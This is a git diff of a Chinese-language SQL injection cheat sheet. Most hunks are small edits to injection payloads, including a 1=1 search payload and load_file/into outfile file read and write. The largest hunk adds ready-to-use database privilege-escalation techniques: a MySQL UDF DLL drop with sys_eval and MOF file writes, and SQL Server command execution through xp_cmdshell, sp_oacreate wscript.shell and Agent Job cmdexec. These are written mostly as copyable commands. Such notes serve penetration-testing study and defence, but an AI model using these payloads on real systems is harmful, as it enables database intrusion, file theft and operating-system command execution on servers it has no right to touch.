@@ -72,7 +72,7 @@
 * 1' link '1/1' link '2
 * 1' in('1')#/'1' in('2')#
 
-搜索型：
+搜索型
 
 - x%' or 1=1#
 
@@ -170,10 +170,6 @@ SQL 注入一般可分为一阶注入（普通注入）和二阶注入。
 4. 为处理第二个 HTTP 请求，应用检索存储在后端数据库中的恶意代码，动态构造 SQL 语句
 5. 若攻击实现，在第二个请求的响应中向攻击者返回结构
 
-- 举例说明
-  1. 在注册用户时假设注册的用户名为 `admin';#`
-  2. 修改该用户的密码，其中 `'` 与前面的引号闭合，`;` 让 SQL 认为该语句结束，`#` 让后面的语句成为注释内容
-
 #### 报错注入
 
 * 通过 extractvalue() 函数报错
@@ -199,8 +195,10 @@ SQL 注入一般可分为一阶注入（普通注入）和二阶注入。
     > group by：分组；                                        x 与 y 都是别名
 
   * 注意事项
-  *    在 MySQL 8.0 版本已失效
-  *    查询的表内数据至少 3 条
+
+    1. 在 MySQL 8.0 版本已失效
+
+    2. 查询的表内数据至少 3 条
 
 #### 布尔盲注
 
@@ -262,7 +260,7 @@ GB2312、GBK、BIG5、GB18030、Shift\_JIS 等这些都是常说的宽字节，�
     * MySQL 用户对文件有读写权限（security_file_priv != NULL）
     * load\_file() 函数操作文件的当前目录是 @@datadir（即数据库存储路径）
     * 文件大小必须小于 max\_allowed\_packet，@@max\_allowed\_packet 的默认大小是16M，最大为1G
-  * SQL语句如下：
+  * SQL 语句如下：
     * `union select 1,load_file('文件路径'),3`
     * `union select 1,load_file(HEX格式),3`
     * `union select 1,load_file(char(ASCII码)),3`
@@ -274,7 +272,7 @@ GB2312、GBK、BIG5、GB18030、Shift\_JIS 等这些都是常说的宽字节，�
     * into outfile 必须是最后一个查询
     * 知道站点物理路径
       * 常见方式：报错显示、遗留文件（phpinfo.php）、配置文件
-  * SQL 语句如下：
+  * SQL语句如下：
     * `select [文本内容|char(ASCII码)] into outfile 文件绝对路径`
     * `select 1 into outfile 文件绝对路径 lines terminated by 16进制内容`
 
@@ -405,6 +403,129 @@ RCE（--os-shell）
   2. 路径名是默认的
   3. 禁用 magic_quotes_gpc
 
+## MySQL 提权
+
+### UDF
+
+UDF（user define function）用户自定义功能。提权的本质是通过以运行 MySQL 服务的用户身份去执行系统命令，所以只适用于 5.7 以下版本。
+
+前提准备
+
+- 查询版本：`select version();`
+  - MySQL < 5.0，路径随意
+  - 5.0 <= MySQL < 5.1，放置系统目录（system32）
+  - MySQL > 5.1，MySQL 安装目录的 `lib\plugin` 文件夹下（默认不存在，需自建）
+- 查询读写权限：`select global variables like secure_file_priv;`
+- 查询插件目录：`show variables like 'plugin_dir'; | select @@plugin_dir;`
+- 查询 OS 架构：`show variables like '%compile%'; | select @@version_compile_os; | select @@version_compile_machine;`
+
+提权步骤
+
+1. 建表：先创建一张临时表存放 DLL/OS 文件的十六进制内容
+   - `create table temp_udf(udf blob);`
+2. 插入：`insert into temp_udf values(convert(DLL/OS的十六进制内容,char));`
+3. 导出：使用 dumpfile，因为它会保持原数据格式
+   * `select udf from temp_udf into dumpfile "DLL/OS 存放路径";`
+4. 创建函数：`create function sys_eval returns string soname "udf.[so|dll]";`
+5. 执行函数：`select sys_eval('whoami');`
+
+### MOF(Windows)
+
+MOF 是 Windows 的托管对象格式文件，位于`C:/Windows/system32/wbem/mof`。server 2003 及以下系统每隔几秒会执行一次 mof 目录下的文件，执行成功会移动到 good 文件夹，失败则移动到 bad 文件夹。
+
+前提准备
+
+1. MySQL 以高权限运行
+2. MySQL 具有写入 mof 目录权限
+3. 只适用于 server 2003 及以下的系统
+
+提权步骤
+
+- 写入文件：`select mof文件十六进制内容 into dumpfile "C:/Windows/system32/wbem/mof/x.mof";`
+
+## SQL server 提权
+
+### xp_cmdshell
+
+xp_cmdshell 可以执行系统命令，在 mssql 2000 是默认开启的，在 mssql 2005 之后默认禁止。管理员 sa 权限可通过 sp_configure 开启。
+
+1. 判断 xp_cmdshell 是否存在，返回 1 则存在：`select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'`
+2. 不存在则开启：`EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE`
+3. 关闭：`EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE`
+4. 执行系统命令：`exec master..xp_cmdshell 'whoami'`
+
+### sp_oacreate + sp_oamethod
+
+在 xp_cmdshell 不能利用的情况下可以考虑 sp_oacreate，利用前提是 sqlserver sysadmin 账户，服务器权限为 system。
+
+sp_oacreate 是一个存储过程，可以删除、复制、移动文件，配合 sp_oamethod 写文件执行系统命令。
+
+1. 判断 sp_oacreate 是否存在，返回 1 则存在：`select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'`
+
+2. 开启：`exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure`
+
+3. 关闭：`exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',0;reconfigure`
+
+4. 执行系统命令：
+
+   ````mssql
+   declare @shell int
+   exec sp_oacreate 'wscript.shell',@shell output
+   exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami'
+   ````
+
+5. 直接执行命令成功后无回显的情况
+
+   ```mssql
+   declare @shell int, @exec int, @text int, @str varchar(8000)
+   exec sp_oacreate 'wscript.shell',@shell output
+   exec sp_oamethod @shell,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
+   exec sp_oamethod @exec, 'StdOut', @text out
+   exec sp_oamethod @text, 'readall', @str out
+   select @str;
+   ```
+
+### 沙盒提权
+
+沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。
+
+利用前提：
+
+- 具有 dba 权限
+- 数据库运行权限为 system
+- 服务器拥有 jet.oledb.4.0 驱动
+
+局限：
+
+- Microsoft.jet.oledb.4.0 一般在 32 位操作系统上才可以
+- Windows 2008 以上默认无 Access 数据库文件，需要自己上传
+- sqlserver 2015 默认禁用 Ad Hoc Distributed Queries，需要开启
+
+### SQL Server Agent  Job
+
+SQL Server Agent 是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业。
+
+- 启动 Agent：`exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'`
+
+- 创建任务 test 并执行命令，将结果写入1.txt
+
+  ```mssql
+  use msdb;
+  exec sp_delete_job null,'test'
+  exec sp_add_job 'test'
+  exec sp_add_jobstep null,'test',null,'1','cmdexec','cmd /c "whoami>c:/1.txt"'
+  exec sp_add_jobserver null,'test',@@servername
+  exec sp_start_job 'test';
+  ```
+
+- 命令执行成功后没有回显，可以把1.txt 写到表中，再查询表中内容获取命令回显
+
+  ```mssql
+  Use model;
+  bulk insert readfile from 'C:\1.txt'
+  select * from readfile
+  ```
+
 ## 番外
 
 ### MySQL 权限
@@ -430,4 +551,3 @@ RCE（--os-shell）
 3. 检查全局权限表 user，如果 user 中对应的权限为 Y，则此用户对所有数据库的权限都为 Y，将不再检查其他表
 4. 若为 N，则到 db 表中检查此用户对应的具体数据库，并得到 db 中为 Y 的权限
 5. 若 db 中为 N，则检查 tables_priv 中此数据库对应的具体表，取得表中的权限 Y，以此类推
-
